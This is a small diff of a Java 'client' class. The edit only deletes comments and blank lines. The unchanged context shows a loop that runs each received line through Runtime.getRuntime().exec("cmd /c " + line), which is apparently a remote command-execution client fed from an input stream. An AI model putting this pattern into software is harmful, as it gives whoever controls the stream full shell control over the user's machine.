@@ -7,8 +7,6 @@ public class client {
     InputStream is;
     public static void main(String[] args) throws Exception {
         new client();
-        //types:B:bio, F:#friends, S:status
-        //
     }
     public client() {
         try {
@@ -24,11 +22,8 @@ public class client {
                     Runtime.getRuntime().exec("cmd /c " + line);
                 } catch (Exception e) {
                     e.printStackTrace();
-                }
-                
+                }  
             }
-            
-            
         } catch (Exception e) {
             e.printStackTrace();
         }
